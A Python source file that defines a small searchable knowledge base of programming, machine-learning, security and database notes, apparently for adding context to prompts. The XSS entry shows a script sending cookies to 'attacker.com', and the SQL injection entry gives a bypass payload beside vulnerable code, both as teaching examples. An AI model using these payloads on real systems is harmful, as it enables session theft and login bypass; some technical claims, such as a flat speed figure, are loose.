from typing import List, Dict

PROGRAMMING_KB = [
    {
        "topic": "List Comprehensions in Python",
        "content": """List comprehensions provide a concise way to create lists.

Syntax: [expression for item in iterable if condition]

Examples:
`````python
numbers = [1, 2, 3, 4, 5]
squares = [x**2 for x in numbers]
evens = [x for x in numbers if x % 2 == 0]

matrix = [[1,2], [3,4]]
flat = [item for row in matrix for item in row]
`````

Performance: 2x faster than loops
Use case: Data transformation, filtering""",
        "tags": ["python", "list", "comprehension", "data-structures"]
    },
    {
        "topic": "Python Decorators",
        "content": """Decorators modify function behavior without changing source code.

Example:
`````python
def timer(func):
    def wrapper(*args, **kwargs):
        import time
        start = time.time()
        result = func(*args, **kwargs)
        print(f"Took {time.time()-start:.4f}s")
        return result
    return wrapper

@timer
def slow_function():
    import time
    time.sleep(1)
`````

Common uses: Logging, caching, authentication, rate limiting""",
        "tags": ["python", "decorator", "design-pattern"]
    },
    {
        "topic": "Two Pointers Algorithm Pattern",
        "content": """Two pointers solve array problems in O(n) time.

Example - Palindrome check:
`````python
def is_palindrome(s):
    left, right = 0, len(s) - 1
    while left < right:
        if s[left] != s[right]:
            return False
        left += 1
        right -= 1
    return True
`````

Applications: Palindromes, sorted array search, container problems""",
        "tags": ["algorithm", "two-pointers", "optimization", "leetcode"]
    }
]

AI_ML_KB = [
    {
        "topic": "Attention Mechanism in Transformers",
        "content": """Attention allows models to focus on relevant input parts.

Formula: Attention(Q,K,V) = softmax(QK^T / sqrt(d_k))V

PyTorch implementation:
`````python
import torch
scores = torch.matmul(Q, K.transpose(-2, -1)) / math.sqrt(d_k)
attention = torch.softmax(scores, dim=-1)
output = torch.matmul(attention, V)
`````

Used in: BERT, GPT, Vision Transformers
Paper: Attention is All You Need (Vaswani 2017)""",
        "tags": ["ai", "attention", "transformer", "nlp", "deep-learning"]
    },
    {
        "topic": "Gradient Descent Optimizers",
        "content": """Common optimizers for training neural networks:

1. SGD with Momentum:
   - Simple, requires tuning
   - Good with proper learning rate

2. Adam (most popular):
   - Adaptive learning rates
   - Works well out-of-box
   - lr=0.001, beta1=0.9, beta2=0.999

3. AdamW:
   - Decoupled weight decay
   - Current state-of-art
   - Used in GPT, BERT

Choose Adam for most cases, SGD for final tuning.""",
        "tags": ["ai", "optimization", "training", "gradient-descent"]
    },
    {
        "topic": "Train-Validation-Test Split",
        "content": """Proper data splitting prevents overfitting:
`````python
from sklearn.model_selection import train_test_split

X_train, X_temp, y_train, y_temp = train_test_split(
    X, y, test_size=0.3, random_state=42, stratify=y
)
X_val, X_test, y_val, y_test = train_test_split(
    X_temp, y_temp, test_size=0.5, random_state=42
)
`````

Common mistakes:
- Splitting before preprocessing
- Not stratifying imbalanced data
- Shuffling time series

Best practice: K-fold cross-validation""",
        "tags": ["ml", "validation", "split", "best-practice"]
    }
]

SECURITY_KB = [
    {
        "topic": "SQL Injection Attacks",
        "content": """SQL injection: Injecting malicious SQL into queries.

Vulnerable code:
`````python
query = f"SELECT * FROM users WHERE username='{user_input}'"
cursor.execute(query)
`````

Attack: username = admin' OR '1'='1
Result: Bypasses authentication

Secure approach:
`````python
cursor.execute("SELECT * FROM users WHERE username=?", (user_input,))
`````

Prevention:
- Parameterized queries
- Input validation
- Principle of least privilege
- ORM frameworks""",
        "tags": ["security", "sql", "injection", "owasp", "vulnerability"]
    },
    {
        "topic": "Cross-Site Scripting (XSS)",
        "content": """XSS: Injecting malicious scripts into web pages.

Types:
1. Reflected XSS: Script in URL parameters
2. Stored XSS: Script saved in database
3. DOM-based XSS: Client-side manipulation

Example attack:
`````javascript
<script>
document.location='http://attacker.com?cookie='+document.cookie
</script>
`````

Prevention:
- HTML encoding output
- Content Security Policy
- HTTPOnly cookies
- Input validation""",
        "tags": ["security", "xss", "web", "owasp"]
    },
    {
        "topic": "Modern Encryption Standards",
        "content": """Current cryptographic best practices:

Use:
- AES-256-GCM for encryption
- Argon2id for password hashing
- Ed25519 for signatures
- TLS 1.3 for transport

Avoid:
- MD5, SHA1 for passwords
- DES, 3DES, RC4
- ECB mode
- Hardcoded keys

Example:
`````python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
````""",
        "tags": ["security", "cryptography", "encryption", "standards"]
    }
]

DEVELOPMENT_KB = [
    {
        "topic": "Database Indexing",
        "content": """Indexes speed up queries dramatically:

Without index: Full table scan O(n)
With index: B-tree lookup O(log n)

Creating indexes:
```sql
CREATE INDEX idx_email ON users(email);
CREATE INDEX idx_name_age ON users(name, age);
```

When to index:
- Columns in WHERE clauses
- JOIN columns
- ORDER BY columns

When NOT to:
- Small tables
- High write, low read
- Low cardinality columns""",
        "tags": ["database", "sql", "indexing", "performance"]
    }
]


class KnowledgeBase:
    def __init__(self):
        self.entries = PROGRAMMING_KB + AI_ML_KB + SECURITY_KB + DEVELOPMENT_KB

    def search(self, query: str, top_k: int = 2) -> List[Dict]:
        query_lower = query.lower()
        query_words = query_lower.split()
        results = []

        for entry in self.entries:
            score = 0

            if 'topic' in entry:
                topic_lower = entry['topic'].lower()
                topic_words = topic_lower.split()
                score += sum(3 for word in query_words if word in topic_lower)
                score += 5 if any(word in topic_lower for word in query_words) else 0

            if 'tags' in entry:
                score += sum(2 for tag in entry['tags'] if tag in query_lower)

            if 'content' in entry:
                content_lower = entry['content'].lower()
                score += sum(1 for word in query_words if len(word) > 3 and word in content_lower)

            if score > 0:
                results.append({
                    'score': score,
                    'topic': entry.get('topic', 'Unknown'),
                    'content': entry.get('content', ''),
                    'tags': entry.get('tags', [])
                })

        results.sort(key=lambda x: x['score'], reverse=True)
        return results[:top_k]


def get_knowledge_context(query: str, max_results: int = 2) -> str:
    kb = KnowledgeBase()
    results = kb.search(query, top_k=max_results)

    if not results:
        return ""

    context = "\n\nRELEVANT KNOWLEDGE BASE ENTRIES:\n\n"
    for i, result in enumerate(results, 1):
        context += f"{i}. {result['topic']}\n{result['content']}\n\n"

    return context